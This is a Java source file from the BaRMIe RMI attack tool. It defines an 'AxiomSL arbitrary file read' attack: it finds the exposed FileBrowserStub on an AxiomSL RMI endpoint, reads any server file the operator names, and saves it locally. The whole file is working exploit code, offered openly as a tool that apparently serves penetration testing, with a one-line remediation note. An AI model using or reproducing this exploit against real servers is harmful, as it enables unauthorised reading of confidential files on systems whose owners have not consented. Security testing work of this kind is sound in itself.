package nb.barmie.modes.attack.attacks.Axiom;

import axiomsl.server.rmi.FileBrowserStub;
import axiomsl.server.rmi.FileInformation;
import java.rmi.RemoteException;
import nb.barmie.exceptions.BaRMIeException;
import nb.barmie.exceptions.BaRMIeRemoteMethodCallException;
import nb.barmie.modes.attack.RMIAttack;
import nb.barmie.modes.enumeration.RMIEndpoint;

/***********************************************************
 * Read arbitrary files from a server running AxiomSL.
 * 
 * Written by Nicky Bloor (@NickstaDB).
 **********************************************************/
public class ReadFile extends RMIAttack {
	/*******************
	 * Set attack properties
	 ******************/
	public ReadFile() {
		super();
		this.setDescription("AxiomSL arbitrary file read");
		this.setDetailedDescription("AxiomSL exposes an object FileBrowserStub, which has a readFile() method that returns the contents of the file at the given path.");
		this.setRemediationAdvice("[AxiomSL] Update AxiomSL to the latest available version.");
	}
	
	/*******************
	 * Check if the given endpoint can be attacked.
	 * 
	 * @param ep An enumerated RMI endpoint.
	 * @return True if we can attack it.
	 ******************/
	public boolean canAttackEndpoint(RMIEndpoint ep) {
		return ep.hasClass("axiomsl.server.rmi.FileBrowserStub");
	}
	
	/*******************
	 * Attack the endpoint.
	 * 
	 * @param ep An enumerated RMI endpoint.
	 ******************/
	public void executeAttack(RMIEndpoint ep) throws BaRMIeException {
		FileBrowserStub fbs;
		FileInformation fi;
		String srcFilename;
		String dstFilename;
		byte[] contents;
		
		//Ask the user for a filename to read
		srcFilename = this.promptUserForInput("Enter a filename to read: ", false);
		
		//Ask the user for a destination filename to write the file contents to
		dstFilename = this.promptUserForInput("Enter a path to save the file to: ", false);
		System.out.println("");
		
		//Get the fileBrowser object from the endpoint
		System.out.println("[~] Getting fileBrowser object...");
		fbs = (FileBrowserStub)this.getRemoteObject(ep, "fileBrowser");
		
		//Attempt to read the file and save the contents locally
		try {
			System.out.println("[+] Retrieved, getting file information...");
			fi = fbs.getFileInformation(srcFilename);
			if(fi.bExists == true && fi.lSize > 0) {
				System.out.println("[+] File exists, size: " + fi.lSize);
				contents = fbs.readFile(srcFilename, 0, (int)fi.lSize);
				if(contents != null) {
					System.out.println("[+] File retrieved, writing local file...");
					this.writeFile(dstFilename, contents);
				} else {
					System.out.println("[-] No data returned");
				}
			} else {
				System.out.println("[-] The file does not exist on the server.");
			}
		} catch(Exception re) {
			//Failed to read the file from the target
			throw new BaRMIeRemoteMethodCallException("Failed to read the remote file.", re);
		}
		
		//Verify presence of downloaded file
		if(this.fileExists(dstFilename)) {
			System.out.println("[+] Requested file has been downloaded.");
		} else {
			System.out.println("[-] Something went wrong whilst attempting to download the file.");
		}
	}
}
